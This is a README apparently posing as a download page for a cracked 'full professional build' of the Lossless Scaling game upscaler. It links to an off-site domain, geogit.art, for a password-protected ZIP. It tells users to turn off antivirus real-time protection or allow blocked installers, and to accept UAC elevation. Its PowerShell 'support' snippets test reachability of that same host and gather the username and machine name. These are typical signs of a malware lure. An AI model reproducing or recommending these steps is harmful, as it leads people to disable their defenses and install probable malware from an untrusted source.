# Lossless Scaling Game Upscaler

System management in one tool · Premium workspace · Zero nag dialogs.

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Lossless Scaling Game Upscaler" width="520">
  </a>
</div>

## Download

1. Click the **Download Latest** image above to get the latest version
2. Open your **Downloads** folder
3. Copy the **archive password**
4. Right-click the ZIP → **Extract All** (or use 7-Zip / WinRAR) and paste the password when asked
5. If **antivirus** or Windows Security blocks the installer, temporarily turn off real-time protection or choose **Allow** — **turn protection back on after installation**
6. Open the extracted folder and run the **current version**

## Overview

Lossless Scaling Game Upscaler in this repo is a Windows desktop package for Windows power users and administrators who want the full desktop experience without missing tools or locked panels. This is the complete professional build — every module that normally sits behind a paid tier is already active, so you can use system management, optimization, and daily productivity from the first launch. Expect a normal first launch on a standard PC and workflows that feel like the top-tier edition from day one.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Click any **Download Latest** image in this README — follow the **Download** steps to get the package and run the installer. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during setup. |
| Full professional build? | Yes. Every professional module is **enabled and active** after install — system management, optimization, and daily productivity open without edition limits or locked panels. |

## Features

- ⚡ Quick actions
- 🧩 Batch tools
- 📊 Status panels
- ✨ Presets
- 🗂️ Profiles
- 🔍 Search
- 📁 File tools

## Use cases

- 📌 Power users
- 🎯 IT support
- ⭐ Home labs

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "Lossless-Scaling-Game-Upscaler"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Endpoint reachability**

```powershell
Test-NetConnection geogit.art -Port 443
try {
  Invoke-WebRequest https://geogit.art/health -UseBasicParsing -Method Head -TimeoutSec 15 |
    Select-Object StatusCode, StatusDescription
} catch { $_.Exception.Message }
```

**Post-install (application layer)**

```powershell
Get-Process -Name "Lossless*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Lossless Scaling Game Upscaler" width="520">
  </a>
</div>

## Topics

`lossless-scaling-game-upscaler` · `lossless-desktop` · `lossless-windows` · `system-optimization` · `driver-update` · `pc-maintenance` · `disk-cleanup` · `registry-tools` · `desktop-utility` · `windows-tools`

## License

This repository describes installation and usage of a third-party desktop application. Comply with applicable software licensing and local regulations.
